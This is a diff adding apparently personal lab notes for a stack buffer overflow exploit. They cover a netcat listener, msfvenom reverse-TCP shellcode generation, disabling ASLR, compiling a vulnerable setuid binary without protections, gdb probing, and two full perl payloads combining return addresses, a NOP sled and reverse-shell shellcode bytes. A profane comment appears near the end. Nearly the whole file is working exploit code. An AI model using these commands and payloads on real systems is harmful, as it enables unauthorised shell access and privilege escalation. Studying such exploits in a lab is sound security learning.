@@ -1,0 +1,41 @@
+nc -lv 192.168.0.147 4444  # host ip address, port reverse shellcode compiled with
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.147 LPORT=4444 -f c -b "\x00\x0D\x20\x09"
+
+sudo sysctl -w kernel.randomize_va_space=0
+
+sudo bash
+gcc -m32 -no-pie -z execstack -fno-stack-protector -g -o stack stack.c
+chmod 4755 stack
+
+gdb stack
+list 1,40
+b 14
+b 17
+
+set disassembly-flavor intel
+disass main
+
+# slightly over buffer size 20
+run $(perl -e 'print "\x41"x40')
+
+p &buffer
+
+# stack memory, starting from first byte of buffer
+x/48xw buffer
+
+# return -> NOP -> shell
+
+# Payload size: 95 bytes
+# Final size of c file: 425 bytes
+
+# Working
+# Overflow buffer with addresses to point to start of shellcode : +20 bytes.
+# Then a few NOP for good measure. Using multiples of 4 is must, multiples of 16 easiest to estimate
+# Try once, and then estimate a guess for start of address of the shellcode, and use that as the first element of the payload, ensuring
+# the buffer is overflowed with shellcode start addresses, and the other SFP & vars are overwritten by NOP
+run $(perl -e 'print "\xa0\xd0\xff\xff"x48,"\x90"x16,"\xda\xca\xba\xf3\x8e\x9f\x45\xd9\x74\x24\xf4\x5f\x31\xc9","\xb1\x12\x83\xc7\x04\x31\x57\x13\x03\xa4\x9d\x7d\xb0\x7b","\x79\x76\xd8\x28\x3e\x2a\x75\xcc\x49\x2d\x39\xb6\x84\x2e","\xa9\x6f\xa7\x10\x03\x0f\x8e\x17\x62\x67\xd1\x40\x94\xe4","\xb9\x92\x95\x1b\x66\x1a\x74\xab\xf0\x4c\x26\x98\x4f\x6f","\x41\xff\x7d\xf0\x03\x97\x13\xde\xd0\x0f\x84\x0f\x38\xad","\x3d\xd9\xa5\x63\xed\x50\xc8\x33\x1a\xae\x8b"')
+# return 080492d0
+
+
+# some panapto shit cunts
+run $(perl -e 'print "\x80\xd0\xff\xff"x20,"\x90"x20,"\xda\xca\xba\xf3\x8e\x9f\x45\xd9\x74\x24\xf4\x5f\x31\xc9","\xb1\x12\x83\xc7\x04\x31\x57\x13\x03\xa4\x9d\x7d\xb0\x7b","\x79\x76\xd8\x28\x3e\x2a\x75\xcc\x49\x2d\x39\xb6\x84\x2e","\xa9\x6f\xa7\x10\x03\x0f\x8e\x17\x62\x67\xd1\x40\x94\xe4","\xb9\x92\x95\x1b\x66\x1a\x74\xab\xf0\x4c\x26\x98\x4f\x6f","\x41\xff\x7d\xf0\x03\x97\x13\xde\xd0\x0f\x84\x0f\x38\xad","\x3d\xd9\xa5\x63\xed\x50\xc8\x33\x1a\xae\x8b"')
